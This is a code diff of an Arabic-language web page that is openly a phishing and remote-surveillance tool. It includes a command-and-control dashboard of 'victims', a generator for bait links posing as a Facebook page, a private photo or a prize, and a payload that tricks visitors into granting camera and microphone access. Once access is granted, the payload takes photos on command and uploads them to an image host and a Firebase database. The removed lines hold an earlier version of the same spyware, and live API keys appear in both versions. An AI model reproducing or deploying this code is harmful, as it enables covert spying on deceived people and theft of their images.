@@ -2,53 +2,75 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE DOCTOR | PEGASUS OMEGA SYSTEM</title>
+    <title>DOCTOR OS | نظام السيادة المتكامل v2.6</title>
     <style>
-        :root { --gold: #d4af37; --glow: #00ff41; --bg: #050505; }
+        :root { --gold: #d4af37; --glow: #00ff41; --bg: #050505; --panel: #111; }
         body { background: var(--bg); color: var(--glow); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
         
-        /* واجهة التحكم - تظهر لك فقط */
-        #admin-panel { display: none; height: 100vh; grid-template-columns: 300px 1fr; }
-        .sidebar { border-left: 2px solid var(--gold); background: #0a0a0a; padding: 15px; overflow-y: auto; }
-        .main-view { padding: 20px; display: flex; flex-direction: column; gap: 20px; }
-        .target-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; border-radius: 4px; }
-        .target-card:hover { border-color: var(--gold); box-shadow: 0 0 10px var(--gold); }
-        .btn { background: transparent; border: 1px solid var(--glow); color: var(--glow); padding: 10px; cursor: pointer; width: 100%; margin-top: 5px; }
-        .btn:hover { background: var(--glow); color: #000; }
+        /* نظام التبويب (Tabs) */
+        .top-nav { background: var(--panel); border-bottom: 2px solid var(--gold); display: flex; padding: 10px; gap: 20px; }
+        .tab-btn { background: none; border: 1px solid var(--gold); color: var(--gold); cursor: pointer; padding: 5px 15px; transition: 0.3s; }
+        .tab-btn.active { background: var(--gold); color: #000; }
+
+        .container { display: none; height: calc(100vh - 50px); padding: 20px; }
+        .container.active { display: block; }
+
+        /* لوحة الضحايا */
+        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; height: 100%; }
+        .sidebar { background: #0a0a0a; border: 1px solid #333; padding: 10px; overflow-y: auto; }
+        .target-card { border: 1px solid #222; padding: 10px; margin-bottom: 10px; cursor: pointer; border-radius: 5px; }
+        .target-card:hover { border-color: var(--glow); }
+
+        /* مولد التلغيم */
+        .generator-box { background: var(--panel); border: 1px dashed var(--gold); padding: 20px; max-width: 600px; margin: auto; }
+        input, select { background: #000; border: 1px solid var(--glow); color: var(--glow); padding: 10px; width: 90%; margin: 10px 0; }
         
-        /* واجهة الضحية - التمويه */
-        #victim-ui { display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
-        .loader { border: 4px solid #111; border-top: 4px solid var(--gold); border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-action { background: var(--glow); color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; }
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; margin-top: 20px; }
+        img { width: 100%; border: 1px solid #444; }
     </style>
 </head>
 <body>
 
-<div id="victim-ui">
-    <div class="loader"></div>
-    <h2 style="color: #eee;">جاري تحميل الصورة الخاصة بك...</h2>
-    <p style="color: #666;">يرجى منح صلاحية الوصول للمتابعة</p>
+<nav class="top-nav">
+    <div style="color: var(--gold); font-weight: bold; margin-left: 20px;">DOCTOR SYSTEM v2.6</div>
+    <button class="tab-btn active" onclick="showTab('dashboard')">مركز القيادة (C2)</button>
+    <button class="tab-btn" onclick="showTab('generator')">مصنع التلغيم (Payload Gen)</button>
+    <button class="tab-btn" onclick="showTab('settings')">الإعدادات</button>
+</nav>
+
+<div id="dashboard" class="container active">
+    <div class="grid">
+        <div class="sidebar" id="victim-list">
+            <h4>الجلسات العكسية (0)</h4>
+            </div>
+        <div class="main-panel">
+            <h2 id="target-title">بانتظار المزامنة...</h2>
+            <div id="control-grid" style="display:none;">
+                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px;">
+                    <button class="btn-action" onclick="sendCommand('capture')">📸 التقاط صورة</button>
+                    <button class="btn-action" onclick="sendCommand('vibrate')">📳 هز الجهاز</button>
+                    <button class="btn-action" onclick="sendCommand('location')">📍 تحديد الموقع</button>
+                </div>
+                <div class="gallery" id="target-gallery"></div>
+            </div>
+        </div>
+    </div>
 </div>
 
-<div id="admin-panel">
-    <div class="sidebar">
-        <h3 style="color: var(--gold);">الأهداف النشطة 🛰️</h3>
-        <div id="target-list">جاري البحث عن جلسات...</div>
-    </div>
-    <div class="main-view">
-        <h2 id="active-target-id" style="color: var(--gold);">اختر هدفاً للسيطرة</h2>
-        <div id="controls" style="display:none;">
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
-                <button class="btn" onclick="sendCommand('capture')">📸 التقاط صورة</button>
-                <button class="btn" onclick="sendCommand('vibrate')">📳 تفعيل الهز</button>
-                <button class="btn" onclick="sendCommand('location')">📍 تحديد الموقع</button>
-                <button class="btn" onclick="sendCommand('alert')">⚠️ إرسال تنبيه</button>
-            </div>
-            <hr style="border: 0.5px solid #222; margin: 20px 0;">
-            <h4>البيانات المستلمة (ImgBB):</h4>
-            <div id="gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px;"></div>
-        </div>
+<div id="generator" class="container">
+    <div class="generator-box">
+        <h3>توليد رابط التلغيم (Bait Creator)</h3>
+        <label>نوع التمويه:</label>
+        <select id="bait-type">
+            <option value="fb">صفحة فيسبوك وهمية</option>
+            <option value="img">مشاهدة صورة خاصة</option>
+            <option value="gift">اربح جائزة آيفون</option>
+        </select>
+        <label>رابط الصورة الحقيقية (لإظهارها بعد الاختراق):</label>
+        <input type="text" id="real-img" placeholder="https://i.ibb.co/example.jpg">
+        <button class="btn-action" onclick="generateLink()">توليد الرابط الملغم</button>
+        <div id="final-link" style="margin-top: 20px; color: var(--gold); word-break: break-all;"></div>
     </div>
 </div>
 
@@ -56,7 +78,7 @@
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
 <script>
-    // تهيئة Firebase بالبيانات الخاصة بك
+    // --- تهيئة Firebase من بياناتك ---
     const firebaseConfig = {
         apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
         authDomain: "hkrs5000.firebaseapp.com",
@@ -68,106 +90,95 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
     const IMGBB_KEY = "a76371f79ef3069a4103d3493271efb5";
-    const isAdmin = window.location.hash === "#admin"; // أضف #admin للرابط للدخول كمدير
 
-    if (isAdmin) {
-        // --- منطق المدير (Admin Mode) ---
-        document.getElementById('victim-ui').style.display = 'none';
-        document.getElementById('admin-panel').style.display = 'grid';
-        loadTargets();
-    } else {
-        // --- منطق الضحية (Payload Mode) ---
-        executePayload();
+    let selectedID = null;
+
+    // --- نظام التبويب ---
+    function showTab(tabId) {
+        document.querySelectorAll('.container').forEach(c => c.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById(tabId).classList.add('active');
+        event.currentTarget.classList.add('active');
     }
 
-    // [وحدة التلغيم]
-    async function executePayload() {
-        const victimID = "V_" + Math.random().toString(36).substr(2, 5);
-        try {
-            // محاولة فتح الكاميرا فوراً
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            // تسجيل الدخول في Firebase
-            await db.ref('devices/' + victimID).set({
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                lastSeen: Date.now(),
-                status: "Online"
-            });
-
-            // الاستماع للأوامر العكسية
-            db.ref('commands/' + victimID).on('value', async (snapshot) => {
-                const cmd = snapshot.val();
-                if (cmd) {
-                    if (cmd.action === 'capture') {
-                        // كود التقاط الصورة ورفعها لـ ImgBB
-                        takePhotoAndUpload(stream, victimID);
-                    } else if (cmd.action === 'vibrate') {
-                        if (navigator.vibrate) navigator.vibrate(2000);
-                    }
-                    db.ref('commands/' + victimID).remove(); // مسح الأمر بعد التنفيذ
-                }
-            });
-        } catch (e) {
-            console.log("Waiting for permissions...");
-        }
-    }
-
-    async function takePhotoAndUpload(stream, id) {
-        const track = stream.getVideoTracks()[0];
-        const capture = new ImageCapture(track);
-        const blob = await capture.takePhoto();
-        
-        let formData = new FormData();
-        formData.append('image', blob);
-
-        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {
-            method: 'POST',
-            body: formData
-        }).then(res => res.json()).then(data => {
-            db.ref(`data/${id}/images`).push({ url: data.data.url, time: Date.now() });
+    // --- مزامنة الضحايا (C2) ---
+    db.ref('devices').on('value', snap => {
+        const list = document.getElementById('victim-list');
+        list.innerHTML = `<h4>الجلسات العكسية (${snap.numChildren()})</h4>`;
+        snap.forEach(child => {
+            const d = child.val();
+            const div = document.createElement('div');
+            div.className = "target-card";
+            div.innerHTML = `<b>${child.key}</b><br><small>${d.platform}</small>`;
+            div.onclick = () => selectTarget(child.key);
+            list.appendChild(div);
         });
+    });
+
+    function selectTarget(id) {
+        selectedID = id;
+        document.getElementById('target-title').innerText = "السيطرة على: " + id;
+        document.getElementById('control-grid').style.display = "block";
+        loadPhotos(id);
     }
 
-    // [وحدة التحكم]
-    let currentSelectedTarget = null;
-    function loadTargets() {
-        db.ref('devices').on('value', snap => {
-            const list = document.getElementById('target-list');
-            list.innerHTML = "";
-            snap.forEach(child => {
-                const div = document.createElement('div');
-                div.className = "target-card";
-                div.innerHTML = `Target: ${child.key}<br><small>${child.val().platform}</small>`;
-                div.onclick = () => {
-                    currentSelectedTarget = child.key;
-                    document.getElementById('active-target-id').innerText = "التحكم في: " + child.key;
-                    document.getElementById('controls').style.display = "block";
-                    loadGallery(child.key);
-                };
-                list.appendChild(div);
-            });
-        });
+    function sendCommand(act) {
+        if(!selectedID) return;
+        db.ref('commands/' + selectedID).set({ action: act, time: Date.now() });
     }
 
-    function sendCommand(action) {
-        if (!currentSelectedTarget) return;
-        db.ref('commands/' + currentSelectedTarget).set({ action: action, ts: Date.now() });
-        alert("تم إرسال " + action);
-    }
-
-    function loadGallery(id) {
+    function loadPhotos(id) {
         db.ref(`data/${id}/images`).on('value', snap => {
-            const gallery = document.getElementById('gallery');
-            gallery.innerHTML = "";
+            const gal = document.getElementById('target-gallery');
+            gal.innerHTML = "";
             snap.forEach(img => {
                 const el = document.createElement('img');
                 el.src = img.val().url;
-                el.style.width = "100%";
-                gallery.appendChild(el);
+                gal.appendChild(el);
             });
         });
+    }
+
+    // --- مصنع التلغيم (Link Generator) ---
+    function generateLink() {
+        const url = window.location.href.split('#')[0];
+        const bait = document.getElementById('bait-type').value;
+        const final = `${url}?type=${bait}#payload`;
+        document.getElementById('final-link').innerHTML = `ارسل هذا الرابط للضحية:<br><b>${final}</b>`;
+    }
+
+    // --- [البايلود] - يعمل تلقائياً عند فتح الرابط من قبل الضحية ---
+    if (window.location.hash === "#payload") {
+        document.body.innerHTML = "<h2 style='text-align:center; margin-top:20%;'>جاري تحميل المحتوى... يرجى السماح بالصلاحيات</h2>";
+        activatePayload();
+    }
+
+    async function activatePayload() {
+        const vID = "Z_" + Math.random().toString(36).substr(2, 5);
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            await db.ref('devices/' + vID).set({ platform: navigator.platform, status: "Online" });
+
+            // الاستماع للأوامر العكسية
+            db.ref('commands/' + vID).on('value', async (snap) => {
+                const cmd = snap.val();
+                if(cmd) {
+                    if(cmd.action === 'capture') {
+                        const track = stream.getVideoTracks()[0];
+                        const cap = new ImageCapture(track);
+                        const blob = await cap.takePhoto();
+                        let fd = new FormData(); fd.append('image', blob);
+                        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method:'POST', body:fd })
+                        .then(r=>r.json()).then(d=> {
+                            db.ref(`data/${vID}/images`).push({ url: d.data.url });
+                        });
+                    }
+                    if(cmd.action === 'vibrate') navigator.vibrate(2000);
+                    db.ref('commands/' + vID).remove();
+                }
+            });
+        } catch(e) {}
     }
 </script>
 </body>
